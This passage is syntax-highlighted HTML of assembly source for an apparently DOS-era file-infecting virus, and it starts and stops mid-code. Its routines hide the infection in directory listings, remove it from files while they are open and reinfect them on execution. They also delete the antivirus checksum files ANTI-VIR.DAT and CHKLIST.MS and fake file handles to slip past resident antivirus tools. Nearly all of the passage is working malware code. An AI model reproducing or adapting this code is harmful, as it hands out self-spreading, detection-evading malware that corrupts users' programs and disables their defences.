        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus2</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Subtract it from file size</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0"> </span><span class="sc1">; fields</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set a more credible seconds</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">         </span><span class="sc1">; value</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">     </span><span class="sc1">; This instruction has the op-</span><span class="sc0">
                        </span><span class="sc1">; code 0000 :)</span><span class="sc0">
  </span><span class="sc5">@@FinStealthDIR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; Recover all registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">0002</span><span class="sc0">            </span><span class="sc1">; Interrupt return</span><span class="sc0">

</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura9</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;; PROGRAM DISINFECTION VIA FCB</span><span class="sc0">

</span><span class="sc5">@@DesinfectaFCB</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">             </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ObtenNombreFCB</span><span class="sc0">    </span><span class="sc1">; Get name of file on the FCB</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; AX=0</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Desinfecta02</span><span class="sc0">      </span><span class="sc1">; Jump here</span><span class="sc0">

</span><span class="sc1">;;; DESINFECSION DE POGRAMAS QE SE HAVREN</span><span class="sc0">
</span><span class="sc1">;;; (pogranm disinfecshion wehn iou open dem)</span><span class="sc0">

</span><span class="sc5">@@DesinfectaHandle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">             </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc5">@@Desinfecta02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ParcheaInt24h</span><span class="sc0"> </span><span class="sc1">; Patch int 24h, 1Bh and 23h</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ch</span><span class="sc0">       </span><span class="sc1">; Check if function 6Ch is used</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Siguiente</span><span class="sc0">     </span><span class="sc1">; If it isn't used, jump</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">        </span><span class="sc1">; Put SI on DX</span><span class="sc0">
  </span><span class="sc5">@@Siguiente</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Save AX on BP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BorraDATs</span><span class="sc0">     </span><span class="sc1">; Delete ANTI-VIR.DAT and CHKLIST.MS (if</span><span class="sc0">
                      </span><span class="sc1">; they exist)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2D00h</span><span class="sc0">     </span><span class="sc1">; Open file</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@FinX00</span><span class="sc0">        </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Put handle on BX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FakeHandle</span><span class="sc0">    </span><span class="sc1">; Fuck resident AVs :)</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetSFT</span><span class="sc0">        </span><span class="sc1">; Get the SFT on ES:DI</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@FinX01</span><span class="sc0">        </span><span class="sc1">; If error, exit</span><span class="sc0">
     </span><span class="sc5">@@KKVH</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">        </span><span class="sc1">; Put BP on AX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">       </span><span class="sc1">; AH=4B?</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Bh</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@KKVI</span><span class="sc0">          </span><span class="sc1">; If it isn't, jump</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MirarsiStealth</span><span class="sc0"> </span><span class="sc1">; Desactivate stealth if it's a special</span><span class="sc0">
                       </span><span class="sc1">; program</span><span class="sc0">
     </span><span class="sc5">@@KKVI</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CambiaAtributos</span><span class="sc0"> </span><span class="sc1">; Change attributes and access mode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4700h</span><span class="sc0">   </span><span class="sc1">; Get date/time from file</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">  </span><span class="sc1">; Save it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fecha</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">LeeCabecera</span><span class="sc0"> </span><span class="sc1">; Read file header (first 18 bytes)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Check if EXE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B2A6h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@DesinfEXE</span><span class="sc0">   </span><span class="sc1">; Jump here if it's an EXE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CF3h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@DesinfEXE</span><span class="sc0">   </span><span class="sc1">; Jump here if it's an EXE</span><span class="sc0">
  </span><span class="sc5">@@DesinfCOM</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0"> </span><span class="sc1">; If first byte isn't a JMP opcode,</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinX02</span><span class="sc0">          </span><span class="sc1">; exit (file is not infected)</span><span class="sc0">
</span><span class="sc5">@@MiraSegundos</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get seconds</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">         </span><span class="sc1">; Are they "60"?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinX02</span><span class="sc0">          </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@SigueDesinf</span><span class="sc0">     </span><span class="sc1">; Jump</span><span class="sc0">
  </span><span class="sc5">@@DesinfEXE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Check if it has the infection mark</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; for EXEs</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MD'</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinX02</span><span class="sc0">      </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@MiraSegundos</span><span class="sc0">
</span><span class="sc5">@@SigueDesinf</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get file size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">      </span><span class="sc1">; Check if the file is too small</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SigueDesinf2</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LongVirus2</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@FinX02</span><span class="sc0">      </span><span class="sc1">; If it's too small, exit</span><span class="sc0">
</span><span class="sc5">@@SigueDesinf2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PtrCasiFinal</span><span class="sc0">    </span><span class="sc1">; Pointer to (end_of_file - 1Ah)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001Ah</span><span class="sc0">   </span><span class="sc1">; Read 1Ah bytes</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@FinX02</span><span class="sc0">      </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get key for decryption</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">      </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; DI=SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0018h</span><span class="sc0">   </span><span class="sc1">; Decrypt all bytes read. They are the</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">         </span><span class="sc1">; original header of the file</span><span class="sc0">
</span><span class="sc5">@@LoopDesinf1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@LoopDesinf1</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Restore registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PtrInicio</span><span class="sc0">   </span><span class="sc1">; File pointer to the beginning</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0018h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">     </span><span class="sc1">; Write original header</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@FinX02</span><span class="sc0">      </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">10000h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">LongVirus2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Put file pointer on the</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; end minus virus size</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FE0h</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3202h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">; Truncate file size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@FinX02</span><span class="sc0">          </span><span class="sc1">; If error, exit</span><span class="sc0">
     </span><span class="sc5">@@FinX03</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get original seconds</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">; Put them on time field</span><span class="sc0">
     </span><span class="sc5">@@FinX02</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Restore date/time</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Fecha</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4701h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RestauraAtributos</span><span class="sc0">   </span><span class="sc1">; Restore original attributes</span><span class="sc0">
     </span><span class="sc5">@@FinX01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">UnfakeHandle</span><span class="sc0">        </span><span class="sc1">; Restore original handle</span><span class="sc0">
     </span><span class="sc5">@@FinX00</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ParcheaInt24h</span><span class="sc0">          </span><span class="sc1">; Unpatch int 24h, 1Bh and 23h</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">             </span><span class="sc1">; Recover all registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">            </span><span class="sc1">; Check if "execute" function</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinInt21h</span><span class="sc0">          </span><span class="sc1">; If it isn't, jump</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Basura10</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0"> </span><span class="sc1">; Save pointer to file</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Basura10</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0"> </span><span class="sc1">; name</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; Execute file (or whatever with func-</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">      </span><span class="sc1">; tion 4Bh)</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">           </span><span class="sc1">; Save flags and AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">     </span><span class="sc1">; Put 4B on AH</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">           </span><span class="sc1">; Save all registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Basura10</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get saved pointer to</span><span class="sc0">
                             </span><span class="sc1">; file name and rein-</span><span class="sc0">
                             </span><span class="sc1">; fect file</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Infecta2</span><span class="sc0">

</span><span class="sc1">;; To save pointer to file name, but it is a memory write zone, too</span><span class="sc0">
</span><span class="sc5">Basura10</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;;;;; WHEN YOU WANT TO GET AN INTERRUPT VECTOR</span><span class="sc0">

</span><span class="sc5">@@ObtenerVector</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; Int 21h vector?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinalOV01</span><span class="sc0">   </span><span class="sc1">; If it isn't, exit</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">           </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; ES=0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">      </span><span class="sc1">; AX=CS</span><span class="sc0">
